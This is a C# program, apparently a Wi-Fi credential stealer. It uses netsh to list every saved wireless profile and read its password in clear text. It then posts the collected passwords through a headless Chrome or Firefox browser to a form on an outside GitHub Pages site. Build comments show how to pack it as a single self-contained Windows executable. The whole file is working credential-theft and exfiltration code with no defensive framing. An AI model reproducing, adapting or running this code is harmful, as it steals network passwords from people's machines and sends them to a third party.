using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Management.Automation;
using OpenQA.Selenium;
// using OpenQA.Selenium.Edge;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Firefox;

// https://github.com/PowerShell/PowerShell/issues/7909
// https://stackoverflow.com/questions/33657532/how-to-view-saved-wifi-passwords-on-windows-7-8-10
// https://itnext.io/app-trimming-in-net-5-reduce-your-app-sizes-dramatically-39891e2bedc1
// 107 MB
// dotnet publish -o .\publish -r win10-x64 -p:PublishSingleFile=true --self-contained true
// Reduced down to: 78 MB
// dotnet publish -o .\publish -r win10-x64 -p:PublishSingleFile=true -p:PublishTrimmed=True -p:TrimMode=CopyUsed --self-contained true
// Conditional compilation symbols: _PUBLISH_CHROMEDRIVER

namespace Remote_Key_Web_Based_Extraction
{
    class Remote_Key_Web_Based_Extraction
    {
        private static List<string> user_profiles_list = new List<string>();

        static void Main(string[] args)
        {
            Remote_Key_Web_Based_Extraction main_program = new Remote_Key_Web_Based_Extraction();
            user_profiles_list = main_program.user_profiles_scan();
            string key_contents = main_program.local_key_content_extraction(user_profiles_list);
            main_program.web_content_key_extraction(key_contents);
        }
        public List<string> user_profiles_scan()
        {
            List<string> temp_user_profiles_list = new List<string>();

            PowerShell ps = PowerShell.Create();
            ps.AddCommand("netsh")
                .AddParameter("wlan show", "profiles");
            var results = ps.Invoke();

            foreach (var item in results)
            {
                if (item.ToString().Contains("All User Profile"))
                {
                    string user_profile_name = item.ToString().Substring(item.ToString().IndexOf(":") + 2, item.ToString().Length - (item.ToString().IndexOf(":") + 2));
                    Console.WriteLine("[+] " + user_profile_name);
                    temp_user_profiles_list.Add(user_profile_name);
                }
            }
            return temp_user_profiles_list;
        }
        public string local_key_content_extraction(List<string> user_profiles_list)
        {
            string key_set = "";
            for (int i = 0; i <= user_profiles_list.Count - 1; i++)
            {
                PowerShell ps = PowerShell.Create();
                ps.AddCommand("netsh")
                    .AddParameter("wlan show profile " + user_profiles_list[i], "key=clear");
                var results = ps.Invoke();

                foreach (var item in results)
                {
                    if (item.ToString().Contains("Key Content"))
                    {
                        string key = item.ToString().Substring(item.ToString().IndexOf(":") + 2, item.ToString().Length - (item.ToString().IndexOf(":") + 2));
                        key_set += user_profiles_list[i] + ":" + key + "|";
                        break;
                    }
                }
            }
            return key_set;
        }
        public void web_content_key_extraction(string key_contents)
        {
            /*
            EdgeOptions edgeOptions = new EdgeOptions();
            var current_drver = new EdgeDriver();
            OpenQA.Selenium.IWebDriver current_drver = new Microsoft.EdgeDriver();
            var options = new EdgeOptions();
            options.UseInPrivateBrowsing = true;
            var current_driver = new EdgeDriver(options);
            */

            try
            {
                Console.WriteLine("[=] Attempting to run Chrome Driver");
                // https://stackoverflow.com/questions/45130993/how-to-start-chromedriver-in-headless-mode
                var chromeOptions = new ChromeOptions();
                chromeOptions.AddArguments("headless");
                OpenQA.Selenium.IWebDriver current_driver = new OpenQA.Selenium.Chrome.ChromeDriver(chromeOptions);
                current_driver.Navigate().GoToUrl(@"https://anthony-t-n.github.io/");
                current_driver.FindElement(By.Name("message")).SendKeys(key_contents);
                current_driver.FindElement(By.Name("send")).Click();
                current_driver.Quit();
            }
            catch (Exception e)
            {
                Console.WriteLine("[=] Attempting to try FireFox Driver");
                Console.WriteLine(e);
                FirefoxOptions fireFoxOptions = new FirefoxOptions();
                fireFoxOptions.AddArgument("--headless");
                OpenQA.Selenium.IWebDriver current_drver = new FirefoxDriver(fireFoxOptions);
                current_drver.Navigate().GoToUrl(@"https://anthony-t-n.github.io/");
                current_drver.FindElement(OpenQA.Selenium.By.Name("message")).SendKeys(key_contents);
                current_drver.FindElement(OpenQA.Selenium.By.Name("send")).Click();
                current_drver.Quit();
            }
            finally
            {
                Console.WriteLine("[+] Successfully extracted content key from local device");
                System.Threading.Thread.Sleep(1000);
            }
        }
    }
}
